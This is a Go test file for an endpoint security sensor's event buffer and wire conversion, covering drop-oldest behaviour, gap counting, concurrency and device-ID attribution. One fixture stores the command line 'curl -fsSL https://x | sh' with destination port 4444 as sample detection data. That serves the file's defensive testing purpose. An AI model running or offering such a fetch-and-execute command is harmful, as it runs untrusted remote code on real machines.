package events

import (
	"sync"
	"testing"
	"time"
)

func ev(id string) *Event {
	return &Event{ID: id, Kind: KindProcess, At: time.Now().UTC()}
}

// The rule the whole design turns on: a full buffer must never block the
// sensor. A sensor that stalls the host under load gets uninstalled, and then
// coverage is zero rather than degraded.
func TestAddNeverBlocks(t *testing.T) {
	b := NewBuffer(4)
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 100000; i++ {
			b.Add(ev("e"))
		}
	}()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("Add blocked on a full buffer")
	}
	if b.Len() != 4 {
		t.Errorf("buffered %d, want the capacity of 4", b.Len())
	}
}

// The oldest goes first: an intrusion is a sequence, and the recent events are
// the ones closest to whatever is happening now.
func TestOldestIsDroppedNotNewest(t *testing.T) {
	b := NewBuffer(3)
	for _, id := range []string{"1", "2", "3", "4", "5"} {
		b.Add(ev(id))
	}
	batch := b.Drain(0)
	if len(batch.Events) != 3 {
		t.Fatalf("drained %d events", len(batch.Events))
	}
	want := []string{"3", "4", "5"}
	for i, e := range batch.Events {
		if e.ID != want[i] {
			t.Fatalf("kept %v, want the newest %v", ids(batch.Events), want)
		}
	}
	if batch.DroppedSinceLast != 2 {
		t.Errorf("droppedSinceLast = %d, want 2", batch.DroppedSinceLast)
	}
}

// A gap has to be visible rather than inferred. A pipeline that drops silently
// produces a clean console during exactly the incident that overwhelmed it.
func TestGapsAreCountedAndReported(t *testing.T) {
	b := NewBuffer(2)
	for i := 0; i < 10; i++ {
		b.Add(ev("e"))
	}

	batch := b.Drain(0)
	if batch.Complete() {
		t.Fatal("a batch following 8 drops reported itself complete")
	}
	if batch.DroppedSinceLast != 8 || batch.DroppedTotal != 8 {
		t.Errorf("dropped since=%d total=%d, want 8 and 8", batch.DroppedSinceLast, batch.DroppedTotal)
	}

	// The since-last counter resets; the lifetime total does not, so the loss
	// stays visible to someone reading a later batch.
	b.Add(ev("e"))
	next := b.Drain(0)
	if !next.Complete() {
		t.Error("a complete batch reported a gap")
	}
	if next.DroppedTotal != 8 {
		t.Errorf("lifetime total = %d, want it preserved", next.DroppedTotal)
	}
}

func TestDrainRespectsMax(t *testing.T) {
	b := NewBuffer(100)
	for i := 0; i < 10; i++ {
		b.Add(ev("e"))
	}
	batch := b.Drain(4)
	if len(batch.Events) != 4 {
		t.Fatalf("drained %d, want 4", len(batch.Events))
	}
	if b.Len() != 6 {
		t.Errorf("buffered %d after a partial drain, want 6", b.Len())
	}

	// Draining an empty buffer is a normal, quiet outcome.
	b.Drain(0)
	empty := b.Drain(0)
	if len(empty.Events) != 0 || !empty.Complete() {
		t.Errorf("empty drain = %+v", empty)
	}
}

// The buffer is written from a sensor goroutine and read from the uplink, so
// concurrent use has to be safe and must not lose count.
func TestConcurrentAddAndDrain(t *testing.T) {
	b := NewBuffer(64)
	var wg sync.WaitGroup
	const writers, perWriter = 8, 2000

	for i := 0; i < writers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < perWriter; j++ {
				b.Add(ev("e"))
			}
		}()
	}

	drained := 0
	stop := make(chan struct{})
	var readerWG sync.WaitGroup
	readerWG.Add(1)
	go func() {
		defer readerWG.Done()
		for {
			select {
			case <-stop:
				drained += len(b.Drain(0).Events)
				return
			default:
				drained += len(b.Drain(16).Events)
			}
		}
	}()

	wg.Wait()
	close(stop)
	readerWG.Wait()

	stats := b.Stats()
	if stats.Accepted != writers*perWriter {
		t.Errorf("accepted = %d, want %d", stats.Accepted, writers*perWriter)
	}
	// Every event is either delivered, still buffered, or counted as dropped.
	// Nothing may vanish unaccounted for.
	total := uint64(drained) + uint64(b.Len()) + stats.DroppedTotal
	if total != writers*perWriter {
		t.Errorf("delivered %d + buffered %d + dropped %d = %d, want %d",
			drained, b.Len(), stats.DroppedTotal, total, writers*perWriter)
	}
}

func TestNilEventsAreIgnored(t *testing.T) {
	b := NewBuffer(4)
	b.Add(nil)
	if b.Len() != 0 || b.Stats().Accepted != 0 {
		t.Error("a nil event was buffered")
	}
}

func TestDefaultCapacity(t *testing.T) {
	for _, capacity := range []int{0, -1} {
		if got := NewBuffer(capacity).Capacity(); got != DefaultCapacity {
			t.Errorf("NewBuffer(%d) capacity = %d, want the default", capacity, got)
		}
	}
}

func ids(list []*Event) []string {
	out := make([]string, len(list))
	for i, e := range list {
		out[i] = e.ID
	}
	return out
}

// A round trip must preserve everything a rule might match on. A field lost in
// transit is a rule that silently stops firing.
func TestProtoRoundTrip(t *testing.T) {
	e := &Event{
		ID: "e1", DeviceID: "dev-1", Hostname: "host-1",
		Kind: KindProcess, At: time.Now().UTC().Truncate(time.Nanosecond),
		PID: 4242, PPID: 100,
	}
	e.Set(FieldImage, "/usr/bin/curl")
	e.Set(FieldCommandLine, "curl -fsSL https://x | sh")
	e.Set(FieldDestinationPort, 4444)
	e.Set("CommandLineArgs", []string{"curl", "-fsSL", "https://x"})

	back := FromProto(e.ToProto(), "dev-1", "host-1")
	if back.ID != e.ID || back.Kind != e.Kind || back.PID != e.PID || back.PPID != e.PPID {
		t.Fatalf("identity lost: %+v", back)
	}
	if !back.At.Equal(e.At) {
		t.Errorf("time = %v, want %v", back.At, e.At)
	}
	for _, field := range []string{FieldImage, FieldCommandLine} {
		if back.String(field) != e.String(field) {
			t.Errorf("%s = %q, want %q", field, back.String(field), e.String(field))
		}
	}
	// Numbers render as text on the wire and must still compare equal.
	if back.String(FieldDestinationPort) != "4444" {
		t.Errorf("port = %q", back.String(FieldDestinationPort))
	}
	// A multi-valued field must not be flattened, or a rule matching one
	// argument starts matching a substring spanning two.
	args := Values(back.Field("CommandLineArgs"))
	if len(args) != 3 || args[1] != "-fsSL" {
		t.Errorf("args = %v", args)
	}
}

// The server knows which mTLS identity sent a batch. An agent that could name
// any device id could attribute its events to another host.
func TestDeviceIDComesFromTheCallerNotTheWire(t *testing.T) {
	e := &Event{ID: "e1", DeviceID: "claimed-by-agent", Kind: KindProcess, At: time.Now()}
	back := FromProto(e.ToProto(), "actual-mtls-identity", "host")
	if back.DeviceID != "actual-mtls-identity" {
		t.Fatalf("deviceId = %q, want the caller's", back.DeviceID)
	}
}

func TestBatchToProtoCarriesTheGap(t *testing.T) {
	b := NewBuffer(2)
	for i := 0; i < 6; i++ {
		b.Add(ev("e"))
	}
	out := BatchToProto(b.Drain(0), "proc-poll")
	if out.DroppedSinceLast != 4 || out.DroppedTotal != 4 {
		t.Errorf("gap lost in conversion: %+v", out)
	}
	if out.Sensor != "proc-poll" {
		t.Errorf("sensor = %q", out.Sensor)
	}
	if len(out.Events) != 2 {
		t.Errorf("events = %d", len(out.Events))
	}
}

func TestFromProtoHandlesNil(t *testing.T) {
	if got := FromProto(nil, "d", "h"); got != nil {
		t.Errorf("FromProto(nil) = %+v", got)
	}
}

// Pre-alert context: the first question an analyst asks is what else this host
// was doing just before.
func TestRecentReturnsContextBeforeAMoment(t *testing.T) {
	r := NewRecent(10)
	base := time.Date(2026, 9, 16, 12, 0, 0, 0, time.UTC)
	for i := 0; i < 6; i++ {
		e := ev("e" + string(rune('0'+i)))
		e.At = base.Add(time.Duration(i) * time.Second)
		r.Add(e)
	}

	// Everything before the fourth event, most recent three.
	got := r.Before(base.Add(3*time.Second), 3)
	if len(got) != 3 {
		t.Fatalf("got %d events, want 3", len(got))
	}
	// Chronological, which is how a sequence reads.
	if got[0].ID != "e1" || got[2].ID != "e3" {
		t.Errorf("order = %v, want e1..e3", ids(got))
	}

	// Events after the moment are excluded: context means what came before.
	for _, e := range r.Before(base, 10) {
		if e.At.After(base) {
			t.Errorf("event at %v is after the alert", e.At)
		}
	}
}

func TestRecentIsBounded(t *testing.T) {
	r := NewRecent(3)
	for i := 0; i < 10; i++ {
		r.Add(ev("e"))
	}
	if r.Len() != 3 {
		t.Errorf("held %d events, want the bound of 3", r.Len())
	}
	r.Add(nil)
	if r.Len() != 3 {
		t.Error("a nil event was stored")
	}
	if NewRecent(0).size != DefaultRecentSize {
		t.Error("a non-positive size did not use the default")
	}
}
